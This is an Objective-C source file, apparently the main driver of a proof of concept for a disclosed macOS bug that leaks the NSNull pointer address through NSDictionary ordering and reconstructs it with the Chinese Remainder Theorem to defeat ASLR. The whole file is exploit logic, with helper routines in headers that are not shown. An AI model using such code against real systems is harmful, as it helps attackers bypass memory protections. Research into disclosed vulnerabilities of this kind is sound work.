#import <Foundation/Foundation.h>
#import "diagnostics.h"
#import "hash-utils.h"
#import "dict-builder.h"
#import "crt-solver.h"
#include <stdio.h>
#include <stdlib.h>

void print_usage(const char *prog_name) {
    printf("Usage: %s\n", prog_name);
    printf("\nDemonstrates ASLR slide extraction through NSDictionary serialization.\n");
    printf("This is a proof-of-concept for the vulnerability disclosed by Project Zero.\n");
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        printf("\n");
        printf("╔════════════════════════════════════════════════════════════════╗\n");
        printf("║  NSDictionary Pointer Leak - ASLR Slide Extraction PoC        ║\n");
        printf("║  Based on Google Project Zero disclosure (Sept 2025)          ║\n");
        printf("╚════════════════════════════════════════════════════════════════╝\n");
        printf("\n");

        // Phase 0: Run diagnostics
        bool appears_vulnerable = run_diagnostics();

        // Get actual NSNull address for verification
        NSNull *null = [NSNull null];
        uintptr_t actual_address = (uintptr_t)null;
        printf("[Info] Actual NSNull address: 0x%lx\n\n", actual_address);

        // Phase 1: Attempt to leak the address using CRT
        printf("========================================\n");
        printf("Phase 1: Address Extraction via CRT\n");
        printf("========================================\n\n");

        uint64_t remainders[NUM_PRIMES];
        uint64_t moduli[NUM_PRIMES];

        // For each prime table size, build dictionaries and extract NSNull position
        for (size_t i = 0; i < NUM_PRIMES; i++) {
            uint64_t prime = TABLE_PRIMES[i];

            printf("[+] Testing with table size %llu\n", prime);

            // Build even pattern dictionary
            NSDictionary *even_dict = build_dict_with_pattern(PATTERN_EVEN, prime);
            NSInteger even_pos = find_nsnull_position(even_dict);

            printf("    Even pattern: NSNull at position %ld\n", (long)even_pos);

            // Build odd pattern dictionary
            NSDictionary *odd_dict = build_dict_with_pattern(PATTERN_ODD, prime);
            NSInteger odd_pos = find_nsnull_position(odd_dict);

            printf("    Odd pattern:  NSNull at position %ld\n", (long)odd_pos);

            // Calculate NSNull mod prime
            uint64_t remainder;
            if (calculate_nsnull_mod(prime, even_pos, odd_pos, &remainder)) {
                remainders[i] = remainder;
                moduli[i] = prime;
                printf("    NSNull mod %llu = %llu\n", prime, remainder);
            } else {
                printf("    [ERROR] Failed to calculate remainder for prime %llu\n", prime);
                remainders[i] = 0;
                moduli[i] = prime;
            }

            printf("\n");
        }

        // Apply Chinese Remainder Theorem
        printf("[+] Applying Chinese Remainder Theorem\n");

        uint64_t leaked_address;
        if (chinese_remainder_theorem(remainders, moduli, NUM_PRIMES, &leaked_address)) {
            printf("    Leaked address: 0x%llx\n", leaked_address);
            printf("    Actual address: 0x%lx\n", actual_address);

            if (leaked_address == actual_address) {
                printf("    Result: MATCH ✓\n\n");

                // Calculate ASLR slide
                // The slide is the offset from the base address
                // For NSNull in shared cache, we'd need to know the expected base
                printf("[+] ASLR Slide Calculation\n");
                printf("    Note: Calculating slide requires knowing the expected base address\n");
                printf("    of NSNull in the shared cache, which varies by macOS version.\n");
                printf("    Leaked address: 0x%llx\n", leaked_address);

                // Estimate slide (this is approximate without knowing exact base)
                uint64_t estimated_slide = leaked_address & 0xFFFFFFFFF0000000ULL;
                printf("    Estimated slide (high bits): 0x%llx\n", estimated_slide);
            } else {
                printf("    Result: MISMATCH ✗\n");
                printf("    Difference: 0x%llx\n",
                       (unsigned long long)llabs((long long)leaked_address - (long long)actual_address));
                printf("\n");
                printf("    This suggests the mitigation has altered the hash behavior\n");
                printf("    or the CRT calculation needs refinement for this system.\n");
            }
        } else {
            printf("    [ERROR] Chinese Remainder Theorem calculation failed\n");
        }

        printf("\n");
        printf("========================================\n");
        printf("Analysis Complete\n");
        printf("========================================\n");

        if (appears_vulnerable && leaked_address == actual_address) {
            printf("\nConclusion: System appears vulnerable to pointer leak attack.\n");
            printf("The exact NSNull address was successfully extracted using only\n");
            printf("serialization output, demonstrating the feasibility of ASLR bypass.\n");
        } else if (!appears_vulnerable) {
            printf("\nConclusion: System appears to have mitigation in place.\n");
            printf("Hash values do not directly expose pointer addresses.\n");
        } else {
            printf("\nConclusion: Attack was unsuccessful.\n");
            printf("Either the system has partial mitigations or the PoC needs\n");
            printf("refinement for this specific macOS version.\n");
        }

        printf("\n");

        return 0;
    }
}
